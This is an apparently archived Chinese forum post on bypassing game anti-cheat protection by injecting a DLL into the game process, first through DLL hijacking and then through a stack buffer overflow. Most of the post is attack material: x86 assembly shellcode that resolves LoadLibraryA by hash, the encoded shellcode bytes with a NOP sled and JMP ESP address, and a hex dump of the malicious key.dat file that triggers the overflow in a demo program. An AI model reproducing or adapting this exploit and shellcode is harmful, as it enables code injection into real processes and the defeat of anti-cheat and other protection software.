

# 利用溢出漏洞绕过游戏保护程序的思路,请高手指点~

> 原文：[`www.pediy.com/kssd/pediy10/65041.html`](https://www.pediy.com/kssd/pediy10/65041.html)

利用溢出漏洞绕过游戏保护程序的思路  
  
现在的反外挂游戏一般都有游戏保护程序(其中以"NX"最为著名-\_-")保护，NX 对游戏的保护可谓铜墙铁壁，我们硬碰硬地去与其较量，使用外部程序读写游戏数据，多半非死即伤（牛人请飘过-\_-），在此，本人分享一个思路：让我们的程序成为游戏进程的一部分，游戏保护程序防外不防内，绕过保护使其沦为华丽丽的马其诺防线。。。。  
我的想法有 2 个,希望高手多多指点,  
  
一：利用 DLL 劫持技术，由于输入表中只包含 DLL 名而没有它的路径名，因此加载程序必须在磁盘上搜索 DLL 文件。首先会尝试从当前程序所在的目录加载 DLL，如果没找到，则在 Windows 系统目录查找，最后是在环境变量中列出的各个目录下查找。利用这个特点，先伪造一个系统同名的 DLL，提供同样的输出表，每个输出函数转向真正的系统 DLL。甚至你可以伪造一个游戏程序的同名 DLL，程序运行加载你的 DLL，干完你想干的事后再转发给原 DLL。  
  
二：利用游戏本身的溢出漏洞，编写 ShellCode 使游戏进程加载我们的 DLL 文件，较之前者而言，这个办法使游戏开发者很难防范，游戏开发者很难保证自己的程序没有溢出……..  
   
下面用一个简单的示例演示一下利用游戏本身的溢出漏洞加载 DLL：  
演示道具:    
1: ExpolitMe.exe 我们假设该程序是有漏洞的游戏程序，其在加载配置文件 key.dat 时会导致缓冲区溢出。  
2: t.dll 我们想让程序加载的 DLL 文件,可以通过该文件实现读写程序内存,我的示例只是弹出一个对话框提示加载成功.  
3: key.dat 和游戏程序处在相同目录下，游戏会读取该文件的内容,导致缓冲区溢出,我们的 shellcode 会写在 key.dat 里.   
文中示例程序我放在  
http://www.fs2you.com/files/f6f390dc-24b5-11dd-82d0-0014221f3995/   
  
通过分析得知, ExpolitMe.exe 在 0040108E 处调用 fscanf 将导致堆栈缓冲区溢出，OK，下面的工作就是编写 ShellCode 加载 DLL.  
这个 ShellCode 只需要完成几个功能:  
1:得到 kernel32.dll 模块的基地址,继而得到 LoadLibraryA 函数的地址  
2:调用 LoadLibraryA 加载 DLL  
3:善后工作  
  
给出一个我写的一个 shellcode,因为自己对 shellcode 研究不深,写得粗糙,高手见笑了..  
代码如下:  
由于 SHELLCODE 中不允许出现 0DH,0CH 20H 等空字符,所以代码有些地方需要处理,  
比如  
mov     eax,   \[eax + 0x0c\],  
可以写成    lea    ecx,\[eax + 0x06\]  
    lea    ecx,\[ecx + 0x06\]  
    mov    eax,\[ecx\]  
类似这样进行微调….  
\_\_asm  
{  
//得到 LoadLibraryA 的地址:  
          mov     eax, fs:\[0x30\]    ;//PEB   
         mov     eax, \[eax + 0x0c\]   ;//LDR\_DATA  
       mov     eax, \[eax + 0x0c\]    
          mov     eax, \[eax\]  
          mov     eax, \[eax\]  
          mov     esi, \[eax + 0x18\]   
          mov     ebx, esi        ;//Get kernel32.dll  
          mov     eax, \[esi + 0x3c\]  
          lea      esi, \[esi + eax\]   ;// esi->nt header  
          add     esi, 0x78      ;// esi->data export  
          mov     esi, \[esi\]    
          lea      esi, \[ebx + esi\]  
          mov     edx, esi     ;// edx save export info  
          mov     esi, \[esi + 0x20\]   ;// esi = function name array  
          lea     esi, \[ebx + esi\]  
          mov     edi, esi  
          mov     ecx, -1  
SEARCH:  
          inc     ecx  
          mov    esi, \[edi + ecx\*4\]   ;// Get fun name  
          lea     esi, \[ebx + esi\]  
  push edi         
  xor edi,edi  
  cld  
Counthash:      ;//用 HASH 值查找 LoadLibraryA   
  xor eax,eax  
  lodsb  
  cmp al,ah  
  jz STRINGOVER  
  ror edi, 7h  
  add edi,eax  
  Counthash  
STRINGOVER:           
  cmp edi, 0x0c917432   ; //LoadLibraryA 的 HASH: 0x0c917432      
pop edi  
  jnz SEARCH    
  mov     eax, \[edx+1ch\]  
  add     eax, ebx  
  mov     eax, \[eax + ecx\*4\]  
  add     eax, ebx  ;//OK,我们终于得到了 LoadLibraryA 的地址  
  
  //给 LoadLibraryA 准备参数，由于 esp 稳定，利用 esp 定位参数  
  lea   esi, dword ptr ss:\[esp+7B\]  
  push  esi     
  call  eax    // 调用 LoadLibraryA 加载  
  ret  
  //我们在这里放上要加载的 DLL 文件名,作为 LoadLibraryA 的参数  
           db       ‘t.dll’,0  
}  
  
经过去除 0CH 0DH 20H 等空字符的处理,我们得到 shellcode  
  
char ShellCode\[\] =   
"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90"  
"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90"  
"\\x99\\x90\\x90\\x90\\x12\\x45\\xFA\\x7F"  
"\\x64\\xA1\\x30\\x00\\x00\\x00\\x8D\\x48"  
"\\x06\\x8D\\x49\\x06\\x8B\\x01\\x8D\\x48\\x06\\x8D\\x49\\x06\\x8B\\x01\\x8B\\x00"  
"\\x8B\\x00\\x8B\\x70\\x18\\x8B\\xDE\\x8B\\x46\\x3C\\x8D\\x34\\x06\\x83\\xC6\\x78"  
"\\x8B\\x36\\x8D\\x34\\x33\\x8B\\xD6\\x8D\\x4E\\x1B\\x8D\\x49\\x05\\x8B\\x31\\x8D"  
"\\x34\\x33\\x8B\\xFE\\xB9\\xFF\\xFF\\xFF\\xFF\\x41\\x8B\\x34\\x8F\\x8D\\x34\\x33"  
"\\x57\\x33\\xFF\\xFC\\x33\\xC0\\xAC\\x3A\\xC4\\x74\\x07\\xC1\\xCF\\x07\\x03\\xF8"  
"\\xEB\\xF2\\x8D\\xBF\\x00\\x00\\x00\\xF7\\x81\\xFF\\x32\\x74\\x91\\x03\\x5F\\x75"  
"\\xD8\\x8B\\x42\\x1C\\x03\\xC3\\x8B\\x04\\x88\\x03\\xC3\\x8D\\x74\\x24\\x7B\\x56"  
"\\xFF\\xD0\\xC3\\x74\\x2E\\x64\\x6C\\x6C\\x00";   
  
  
  
我们设计的 key.dat 如下：  
其中红色字体标注的 7F FA 45 12 为 JMP ESP 的地址  
蓝色字体 8D 74 24 7B 56 FF D0 是调用 LoadLibraryA 的代码：  
lea     esi, dword ptr ss:\[esp+7B\]  
push    esi  
call  eax  
红色字体标注的 C3 是我简略的善后代码  
蓝色字体标注的 74 2E 64 6C 6C 00 为 LoadLibraryA 的参数 “t.dll”  
  
Offset      0  1  2  3  4  5  6  7   8  9  A  B  C  D  E  F  
00000000   90 90 90 90 90 90 90 90   90 90 90 90 90 90 90 90     
00000010   90 90 90 90 90 90 90 90   90 90 90 90 90 90 90 90     
00000020   99 90 90 90 12 45 FA 7F   64 A1 30 00 00 00 8D 48    
00000030   06 8D 49 06 8B 01 8D 48   06 8D 49 06 8B 01 8B 00   
00000040   8B 00 8B 70 18 8B DE 8B   46 3C 8D 34 06 83 C6 78   
00000050   8B 36 8D 34 33 8B D6 8D  4E 1B 8D 49 05 8B 31 8D   
00000060   34 33 8B FE B9 FF  FF  FF   FF 41 8B 34 8F 8D 34 33   
00000070   57 33 FF FC 33 C0 AC 3A   C4 74 07 C1 CF 07 03 F8   
00000080   EB F2 8D BF 00 00 00 F7   81 FF 32 74 91 03 5F 75    
00000090   D8 8B 42 1C 03 C3 8B 04  88 03 C3 8D 74 24 7B 56   
000000A0   FF D0 C3 74 2E 64 6C 6C  00              
           
OK，我们来测试一下，写好 key.dat,拷贝 DLL 到 ExpolitMe.exe 文件目录下，  
打开 ExpolitMe.exe  
提示 弹出对话框“加载成功！”（我的 DLL 会在加载后弹出对话框“加载成功！”）  
由于本文重在思路分享，例子给的简陋了些，各位应该能写出更精致的 shellcode 和 DLL 吧-\_-~  
  
文中示例程序我放在  
http://www.fs2you.com/files/f6f390dc-24b5-11dd-82d0-0014221f3995/   
  
本文得到 backer 老师指点,在此表示感谢….顺便给 backer 老师的网站打个小广告  
http://www.51asm.com/